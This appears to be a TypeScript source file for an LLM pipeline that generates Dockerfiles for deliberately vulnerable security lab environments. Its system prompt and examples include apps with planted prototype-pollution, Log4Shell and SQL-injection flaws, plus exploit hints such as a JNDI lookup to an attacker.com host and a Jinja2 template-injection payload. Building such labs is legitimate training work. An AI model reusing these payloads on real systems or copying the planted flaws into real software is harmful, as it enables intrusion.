/**
 * Dockerfile generation tool definitions for LLM
 * Stage 2 of the pipeline: Recipe -> Dockerfile
 */

import type { ToolDefinition } from "../types";

/**
 * Tool for generating Dockerfile and source files from recipe
 */
export const generateDockerfileTool: ToolDefinition = {
  name: "generate_dockerfile",
  description: `Generate a complete Docker build context including Dockerfile AND all required source files for a vulnerable environment.

IMPORTANT: You must generate ALL source files that the Dockerfile references. For example:
- If Dockerfile has "COPY app.js .", you must include app.js in sourceFiles
- If Dockerfile has "COPY Log4jVulnerableApp.java .", you must include that Java file
- If Dockerfile has "COPY package.json .", you must include package.json

The vulnerable application should be minimal but functional - just enough to demonstrate the vulnerability.`,
  parameters: {
    type: "object",
    properties: {
      dockerfile: {
        type: "string",
        description: "The complete Dockerfile content. Use COPY for source files you provide in sourceFiles array.",
      },
      sourceFiles: {
        type: "array",
        description: "Array of source files needed to build the vulnerable application. Include ALL files referenced by COPY in the Dockerfile.",
        items: {
          type: "object",
          properties: {
            filename: {
              type: "string",
              description: "The filename (e.g., 'app.js', 'VulnerableApp.java', 'package.json')",
            },
            content: {
              type: "string",
              description: "The complete file content",
            },
          },
          required: ["filename", "content"],
        },
      },
      baseImage: {
        type: "string",
        description: "The base Docker image used (e.g., ubuntu:20.04, node:14, openjdk:8)",
      },
      exposedPorts: {
        type: "array",
        description: "List of ports exposed by the container",
        items: { type: "number" },
      },
      entrypoint: {
        type: "string",
        description: "The entrypoint command to start the vulnerable service",
      },
      vulnerabilityNotes: {
        type: "string",
        description: "Detailed notes explaining: 1) How the vulnerability works, 2) Example exploit payloads, 3) What to look for when exploiting",
      },
      confidence: {
        type: "number",
        description: "Your confidence score (0-100) that this Dockerfile will create a working, exploitable environment",
      },
      confidenceReason: {
        type: "string",
        description: "Brief explanation of why you rated your confidence at this level",
      },
    },
    required: ["dockerfile", "sourceFiles", "baseImage", "exposedPorts", "entrypoint", "vulnerabilityNotes", "confidence", "confidenceReason"],
  },
};

export const dockerfileTools: ToolDefinition[] = [generateDockerfileTool];

/**
 * System prompt for Dockerfile generation
 */
export const DOCKERFILE_SYSTEM_PROMPT = `You are an expert DevOps engineer and security researcher who creates Dockerfiles for vulnerable lab environments.

Your task is to generate a Dockerfile that sets up a specific vulnerable version of software based on the provided recipe. The container should be:

=== CRITICAL: USE OFFICIAL DOCKER IMAGES ===
ALWAYS check Docker Hub for official images FIRST before building from source:
- Apache httpd: use "httpd:2.4.49" NOT build from source
- Nginx: use "nginx:1.19.0" NOT build from source
- Node.js: use "node:14" NOT install via apt
- PHP: use "php:7.4-apache" NOT build PHP

When using official images like httpd:X.Y.Z:
- The software is ALREADY compiled and configured
- DON'T add LoadModule lines for modules that are already loaded
- DON'T COPY a new httpd.conf - it will break the default config!
- Use 'sed -i' to UNCOMMENT existing disabled modules (e.g., sed -i 's/#LoadModule cgi/LoadModule cgi/')
- Use 'echo' to APPEND new config lines (e.g., echo '<Directory ...>' >> httpd.conf)
- The default CMD/entrypoint is already set correctly
- Config files are in standard locations (/usr/local/apache2/conf/ for httpd)

WRONG (will break):
  COPY httpd.conf /usr/local/apache2/conf/httpd.conf

RIGHT (modify in-place):
  RUN sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf

The container should be:
1. Reproducible - same build every time
2. Exploitable - the vulnerability must be triggerable
3. Isolated - designed to run in a controlled lab environment
4. Documented - include comments explaining the setup

Guidelines for different vulnerability types:

**Web Applications (React, Node.js, PHP, etc.):**
- Use specific vulnerable package versions in package.json or composer.json
- Include a simple vulnerable application that demonstrates the issue
- Expose the web server port (usually 3000, 8080, or 80)

**Java Applications (Log4j, Spring, Deserialization):**
- Use specific JDK and library versions
- Include a minimal vulnerable application
- Configure logging/serialization to be exploitable

**Server Software (Apache, Nginx, etc.):**
- PREFER official Docker Hub images (e.g., httpd:2.4.49, nginx:1.19.0) - they are pre-built and work out of the box
- Only build from source if the exact version isn't available as a Docker image
- When using official images like httpd:X.Y.Z:
  - The image already has Apache compiled and configured
  - Use 'sed' to uncomment/modify existing config, don't add LoadModule lines that already exist
  - The entrypoint is 'httpd-foreground' (already set as CMD)
  - Config file is at /usr/local/apache2/conf/httpd.conf
- Configure with vulnerable settings enabled
- Include vulnerable CGI scripts if needed

**Database (SQL Injection labs):**
- Set up database with sample data
- Include vulnerable PHP/Python application
- Use weak or no input sanitization

Always include:
- LABEL with CVE, software, and version info
- HEALTHCHECK to verify service is running
- Non-root user when possible (but may need root for some exploits)
- Clear comments explaining the vulnerability setup

=== CONFIDENCE SCORING ===
Rate your confidence 0-100 that this Dockerfile will create a working, exploitable environment:

- 90-100: Well-documented CVE, exact vulnerable version available, simple setup (e.g., Log4Shell, Apache path traversal)
- 70-89: Known CVE, version available, some configuration needed
- 50-69: CVE exists but complex setup, unclear versions, or multiple dependencies
- 30-49: Limited information, may require custom configuration or manual steps
- 0-29: Cannot reliably create a working exploit environment

BE HONEST. If you're unsure about version availability, setup complexity, or exploitability, say so.
Low confidence is better than wasted build attempts. We will skip retries for low-confidence Dockerfiles.

=== FEW-SHOT EXAMPLES ===

The following examples show CORRECT and INCORRECT approaches. Study them carefully.

---
## EXAMPLE 1: React App with Vulnerable Dependency (CORRECT)

**Scenario:** Create a lab for a prototype pollution vulnerability in lodash < 4.17.12

**CORRECT Output:**

Dockerfile:
\`\`\`dockerfile
FROM node:16-alpine

LABEL cve="CVE-2019-10744"
LABEL software="lodash"
LABEL version="4.17.11"

WORKDIR /app

# Copy package files first for better caching
COPY package.json ./

# Install dependencies
RUN npm install

# Copy application source
COPY server.js ./

EXPOSE 3000

# Health check
HEALTHCHECK --interval=30s --timeout=3s CMD wget -q --spider http://localhost:3000/health || exit 1

CMD ["node", "server.js"]
\`\`\`

sourceFiles:
\`\`\`json
[
  {
    "filename": "package.json",
    "content": "{\n  \"name\": \"lodash-vuln-lab\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"lodash\": \"4.17.11\",\n    \"express\": \"^4.18.0\"\n  }\n}"
  },
  {
    "filename": "server.js",
    "content": "const express = require('express');\nconst _ = require('lodash');\n\nconst app = express();\napp.use(express.json());\n\n// Health check endpoint\napp.get('/health', (req, res) => res.send('OK'));\n\n// VULNERABLE: User input passed directly to lodash merge\napp.post('/merge', (req, res) => {\n  const target = {};\n  // CVE-2019-10744: Prototype pollution via merge\n  _.merge(target, req.body);\n  res.json({ result: target, polluted: ({}).polluted });\n});\n\napp.listen(3000, () => console.log('Vulnerable server on :3000'));\n"
  }
]
\`\`\`

exploitHint: "Send POST to /merge with body: {\"__proto__\": {\"polluted\": \"yes\"}}. Check response - if 'polluted' field appears, prototype pollution succeeded."

**WHY THIS IS CORRECT:**
1. [OK] package.json is in sourceFiles (referenced by COPY)
2. [OK] server.js is in sourceFiles (referenced by COPY)
3. [OK] Exact vulnerable version (4.17.11) specified
4. [OK] Minimal but functional app that exposes the vulnerability
5. [OK] Health check included
6. [OK] Clear exploit instructions

---
## EXAMPLE 1: React App with Vulnerable Dependency (INCORRECT)

**INCORRECT Output - Missing sourceFiles:**

Dockerfile:
\`\`\`dockerfile
FROM node:16-alpine
WORKDIR /app
COPY package.json ./
COPY server.js ./
RUN npm install
CMD ["node", "server.js"]
\`\`\`

sourceFiles: [] <!-- WRONG! Files referenced but not provided -->

**WHY THIS FAILS:**
1. [FAIL] COPY package.json - but package.json NOT in sourceFiles -> Build fails: "COPY failed: file not found"
2. [FAIL] COPY server.js - but server.js NOT in sourceFiles -> Build fails
3. [FAIL] No health check
4. [FAIL] No labels

---
## EXAMPLE 2: Java Log4j Application (CORRECT)

**Scenario:** Create Log4Shell (CVE-2021-44228) lab

**CORRECT Output:**

Dockerfile:
\`\`\`dockerfile
FROM openjdk:8-jdk-slim

LABEL cve="CVE-2021-44228"
LABEL software="Apache Log4j2"
LABEL version="2.14.1"

WORKDIR /app

# Install curl for downloading JARs
RUN apt-get update && apt-get install -y --no-install-recommends curl && rm -rf /var/lib/apt/lists/*

# Download vulnerable Log4j version
RUN mkdir -p lib && \\
    curl -sL -o lib/log4j-core-2.14.1.jar https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar && \\
    curl -sL -o lib/log4j-api-2.14.1.jar https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar

# Copy and compile application
COPY VulnerableApp.java .
RUN javac -cp "lib/*" VulnerableApp.java

EXPOSE 8080

HEALTHCHECK --interval=10s --timeout=3s CMD curl -f http://localhost:8080/ || exit 1

CMD ["java", "-cp", ".:lib/*", "VulnerableApp"]
\`\`\`

sourceFiles:
\`\`\`json
[
  {
    "filename": "VulnerableApp.java",
    "content": "import com.sun.net.httpserver.HttpServer;\nimport com.sun.net.httpserver.HttpHandler;\nimport com.sun.net.httpserver.HttpExchange;\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\nimport java.io.*;\nimport java.net.InetSocketAddress;\n\npublic class VulnerableApp {\n    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);\n\n    public static void main(String[] args) throws Exception {\n        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);\n        server.createContext(\"/\", new VulnerableHandler());\n        server.start();\n        System.out.println(\"Server started on port 8080\");\n    }\n\n    static class VulnerableHandler implements HttpHandler {\n        public void handle(HttpExchange exchange) throws IOException {\n            String userAgent = exchange.getRequestHeaders().getFirst(\"User-Agent\");\n            // VULNERABLE: User input logged directly - triggers JNDI lookup\n            logger.info(\"Request from: \" + userAgent);\n            \n            String response = \"Hello! Your User-Agent was logged.\";\n            exchange.sendResponseHeaders(200, response.length());\n            try (OutputStream os = exchange.getResponseBody()) {\n                os.write(response.getBytes());\n            }\n        }\n    }\n}\n"
  }
]
\`\`\`

exploitHint: "Send request with User-Agent header: \${jndi:ldap://attacker.com/exploit}. Monitor for DNS/LDAP callback to confirm RCE."

**WHY THIS IS CORRECT:**
1. [OK] VulnerableApp.java provided in sourceFiles
2. [OK] Downloads exact vulnerable Log4j version (2.14.1)
3. [OK] Minimal HTTP server that logs user input
4. [OK] Clear exploit path via User-Agent header

---
## EXAMPLE 2: Java Log4j Application (INCORRECT)

**INCORRECT Output - Wrong version, missing files:**

Dockerfile:
\`\`\`dockerfile
FROM openjdk:11
WORKDIR /app
RUN apt-get update && apt-get install -y maven
COPY pom.xml .
COPY src/ ./src/
RUN mvn package
CMD ["java", "-jar", "target/app.jar"]
\`\`\`

sourceFiles:
\`\`\`json
[
  {
    "filename": "pom.xml",
    "content": "<project>...</project>"
  }
]
\`\`\`

**WHY THIS FAILS:**
1. [FAIL] COPY src/ - but src/ directory NOT in sourceFiles -> Build fails
2. [FAIL] Uses Maven which adds complexity and potential network failures
3. [FAIL] pom.xml doesn't specify vulnerable Log4j version
4. [FAIL] OpenJDK 11+ has some mitigations, should use OpenJDK 8

---
## EXAMPLE 3: Python Flask SSTI (CORRECT)

**Scenario:** Server-Side Template Injection in Jinja2

**CORRECT Output:**

Dockerfile:
\`\`\`dockerfile
FROM python:3.9-slim

LABEL vulnerability="SSTI"
LABEL software="Flask/Jinja2"

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY app.py .

EXPOSE 5000

HEALTHCHECK --interval=10s --timeout=3s CMD curl -f http://localhost:5000/ || exit 1

CMD ["python", "app.py"]
\`\`\`

sourceFiles:
\`\`\`json
[
  {
    "filename": "requirements.txt",
    "content": "flask==2.0.0\nJinja2==3.0.0"
  },
  {
    "filename": "app.py",
    "content": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # VULNERABLE: User input directly in template\n    template = f'<h1>Hello {name}!</h1>'\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\n"
  }
]
\`\`\`

exploitHint: "Visit /?name={{config}} to leak config. For RCE: /?name={{''.__class__.__mro__[1].__subclasses__()}}"

---
## EXAMPLE 4: Apache httpd Path Traversal (CORRECT vs INCORRECT)

**CORRECT - Using official image with sed:**
\`\`\`dockerfile
FROM httpd:2.4.49

RUN sed -i 's/#LoadModule cgid_module/LoadModule cgid_module/' /usr/local/apache2/conf/httpd.conf
RUN echo '<Directory />' >> /usr/local/apache2/conf/httpd.conf && \\
    echo '    Require all granted' >> /usr/local/apache2/conf/httpd.conf && \\
    echo '</Directory>' >> /usr/local/apache2/conf/httpd.conf

EXPOSE 80
CMD ["httpd-foreground"]
\`\`\`
sourceFiles: [] <!-- Correct! No source files needed for config-only changes -->

**INCORRECT - Replacing config file:**
\`\`\`dockerfile
FROM httpd:2.4.49
COPY httpd.conf /usr/local/apache2/conf/httpd.conf  <!-- WRONG! -->
EXPOSE 80
CMD ["httpd-foreground"]
\`\`\`

**WHY THE INCORRECT VERSION FAILS:**
1. [FAIL] Replacing httpd.conf removes critical default settings
2. [FAIL] httpd.conf not in sourceFiles anyway
3. [FAIL] Will cause Apache to fail to start with cryptic errors

---
## COMMON MISTAKES TO AVOID

| Mistake | Why It Fails | Fix |
|---------|--------------|-----|
| COPY file without sourceFiles entry | Build error: file not found | Add file to sourceFiles array |
| Using :latest tag | Version may not be vulnerable | Use exact vulnerable version |
| Building from source when image exists | Slow, error-prone | Use official Docker Hub image |
| Replacing config files | Breaks default setup | Use sed to modify in-place |
| Missing HEALTHCHECK | Can't detect if service started | Add appropriate health check |
| Installing via apt when image exists | Wrong version, slow | Use language-specific image |
| Complex build steps | More failure points | Keep it minimal |

---
## CHECKLIST BEFORE SUBMITTING

Before generating output, verify:
1. [ ] Every file in COPY/ADD commands is in sourceFiles
2. [ ] Exact vulnerable version specified (not "latest", not ranges)
3. [ ] Using official Docker image if available
4. [ ] HEALTHCHECK included
5. [ ] Labels with CVE/version info
6. [ ] Minimal application that exposes the vulnerability
7. [ ] Clear exploit instructions`;

/**
 * NVD metadata structure
 */
export interface NVDMetadata {
  cve_id: string;
  description: string;
  cvss_score: number | null;
  cvss_severity: string | null;
  affected_products: Array<{
    cpe: string;
    versionStart?: string | null;
    versionEnd?: string | null;
    versionEndExcluding?: string | null;
  }>;
  references: string[];
}

/**
 * Build the prompt for Dockerfile generation
 */
export function buildDockerfilePrompt(
  recipe: {
    name: string;
    description: string;
    software: string;
    versionConstraint?: string | null;
    exploitFamily?: string | null;
  },
  nvdMetadata?: NVDMetadata | null
): string {
  let prompt = `Generate a Dockerfile for the following vulnerable lab environment:

**Recipe Name:** ${recipe.name}
**Software:** ${recipe.software}
**Vulnerable Version:** ${recipe.versionConstraint || "Any vulnerable version"}
**Exploit Family:** ${recipe.exploitFamily || "Unknown"}
**Description:** ${recipe.description}
`;

  // Add NVD context if available
  if (nvdMetadata) {
    prompt += `
=== CVE DETAILS FROM NVD ===
**CVE ID:** ${nvdMetadata.cve_id}
**CVSS Score:** ${nvdMetadata.cvss_score ?? "N/A"} (${nvdMetadata.cvss_severity ?? "Unknown"})
**NVD Description:** ${nvdMetadata.description}

**Affected Products (use EXACT vulnerable version):**
${nvdMetadata.affected_products
  .filter((p) => p.cpe.includes(recipe.software.toLowerCase()))
  .slice(0, 5)
  .map((p) => `- ${p.cpe}`)
  .join("\n") || "- See CPE data above"}

**Reference URLs:**
${nvdMetadata.references.slice(0, 3).join("\n")}
`;
  }

  // Add few-shot example for Apache httpd
  if (recipe.software.toLowerCase().includes("apache") || recipe.software.toLowerCase().includes("httpd")) {
    prompt += `
=== WORKING EXAMPLE FOR APACHE HTTPD ===
This Dockerfile WORKS. Follow this pattern EXACTLY:

\`\`\`dockerfile
FROM httpd:2.4.49

LABEL cve="CVE-2021-41773"
LABEL software="Apache httpd"
LABEL version="2.4.49"

# Enable CGI by UNCOMMENTING existing module (don't add new LoadModule!)
RUN sed -i 's/#LoadModule cgid_module/LoadModule cgid_module/' /usr/local/apache2/conf/httpd.conf && \\
    sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf

# APPEND config (don't replace httpd.conf!)
RUN echo '<Directory "/usr/local/apache2/cgi-bin">' >> /usr/local/apache2/conf/httpd.conf && \\
    echo '    Options +ExecCGI' >> /usr/local/apache2/conf/httpd.conf && \\
    echo '    Require all granted' >> /usr/local/apache2/conf/httpd.conf && \\
    echo '</Directory>' >> /usr/local/apache2/conf/httpd.conf

EXPOSE 80

CMD ["httpd-foreground"]
\`\`\`

CRITICAL: Do NOT use "COPY httpd.conf" - it will break the container!
`;
  }

  prompt += `
=== REQUIREMENTS ===
1. Use the EXACT vulnerable version from affected products above
2. The vulnerability must be exploitable out of the box
3. Include any necessary configuration to make the service vulnerable
4. Include ALL source files referenced by COPY/ADD in the sourceFiles array
5. Expose the correct ports for the service
6. Add labels with CVE, software, and version info
7. Rate your confidence (0-100) honestly - low confidence saves wasted builds

Generate the complete Dockerfile and provide notes on how to exploit the vulnerability.`;

  return prompt;
}

/**
 * Example Dockerfiles for common vulnerabilities (used as few-shot examples)
 */
export const DOCKERFILE_EXAMPLES: Record<string, string> = {
  "react-scripts": `# React2Shell Vulnerability Lab
# Vulnerable react-scripts version with RCE
FROM node:14-alpine

LABEL maintainer="OctoLab"
LABEL cve="React2Shell"
LABEL software="react-scripts"
LABEL version="<4.0.3"

WORKDIR /app

# Create vulnerable React app with old react-scripts
RUN npm init -y && \\
    npm install react@17.0.2 react-dom@17.0.2 react-scripts@3.4.0

# Copy vulnerable app source
COPY --chown=node:node . .

# Expose dev server port
EXPOSE 3000

# Run as non-root
USER node

# Start development server (vulnerable to RCE)
CMD ["npm", "start"]`,

  "log4j": `# Log4Shell (CVE-2021-44228) Vulnerability Lab
FROM openjdk:8-jdk-slim

LABEL maintainer="OctoLab"
LABEL cve="CVE-2021-44228"
LABEL software="Apache Log4j2"
LABEL version="2.14.1"

WORKDIR /app

# Install vulnerable Log4j version
RUN apt-get update && apt-get install -y curl && \\
    mkdir -p /app/lib

# Download vulnerable Log4j JARs
RUN curl -L -o /app/lib/log4j-core-2.14.1.jar \\
    https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar && \\
    curl -L -o /app/lib/log4j-api-2.14.1.jar \\
    https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar

# Copy vulnerable application
COPY VulnerableApp.java /app/
COPY log4j2.xml /app/

# Compile the application
RUN javac -cp "/app/lib/*" VulnerableApp.java

EXPOSE 8080

# Run vulnerable application
CMD ["java", "-cp", "/app:/app/lib/*", "VulnerableApp"]`,

  "apache-httpd": `# Apache Path Traversal (CVE-2021-41773) Lab
# IMPORTANT: Use official httpd Docker image - it's pre-built and ready to use
FROM httpd:2.4.49

LABEL maintainer="OctoLab"
LABEL cve="CVE-2021-41773"
LABEL software="Apache httpd"
LABEL version="2.4.49"

# Enable CGI modules by uncommenting existing lines (don't add new LoadModule!)
# The httpd image already has these modules compiled, just need to enable them
RUN sed -i 's/#LoadModule cgid_module/LoadModule cgid_module/' /usr/local/apache2/conf/httpd.conf && \\
    sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf

# Configure CGI directory with vulnerable settings (Require all granted enables path traversal)
RUN echo '<Directory "/usr/local/apache2/cgi-bin">' >> /usr/local/apache2/conf/httpd.conf && \\
    echo '    Options +ExecCGI' >> /usr/local/apache2/conf/httpd.conf && \\
    echo '    Require all granted' >> /usr/local/apache2/conf/httpd.conf && \\
    echo '</Directory>' >> /usr/local/apache2/conf/httpd.conf

EXPOSE 80

# httpd-foreground is already the default CMD in the base image
CMD ["httpd-foreground"]`,

  "sql-injection": `# SQL Injection Lab
FROM php:7.4-apache

LABEL maintainer="OctoLab"
LABEL vulnerability="SQL Injection"
LABEL software="PHP + MySQL"

# Install mysqli extension
RUN docker-php-ext-install mysqli pdo pdo_mysql

# Copy vulnerable PHP application
COPY --chown=www-data:www-data vulnerable-app/ /var/www/html/

# Create vulnerable login page
RUN echo '<?php\\n\\
$conn = new mysqli("db", "root", "password", "vuln_db");\\n\\
if (isset($_POST["username"]) && isset($_POST["password"])) {\\n\\
    $user = $_POST["username"];\\n\\
    $pass = $_POST["password"];\\n\\
    // VULNERABLE: No input sanitization\\n\\
    $sql = "SELECT * FROM users WHERE username=\\x27$user\\x27 AND password=\\x27$pass\\x27";\\n\\
    $result = $conn->query($sql);\\n\\
    if ($result->num_rows > 0) {\\n\\
        echo "Login successful!";\\n\\
    } else {\\n\\
        echo "Invalid credentials";\\n\\
    }\\n\\
}\\n\\
?>\\n\\
<form method="POST">\\n\\
    <input name="username" placeholder="Username">\\n\\
    <input name="password" type="password" placeholder="Password">\\n\\
    <button type="submit">Login</button>\\n\\
</form>' > /var/www/html/index.php

EXPOSE 80

CMD ["apache2-foreground"]`,
};
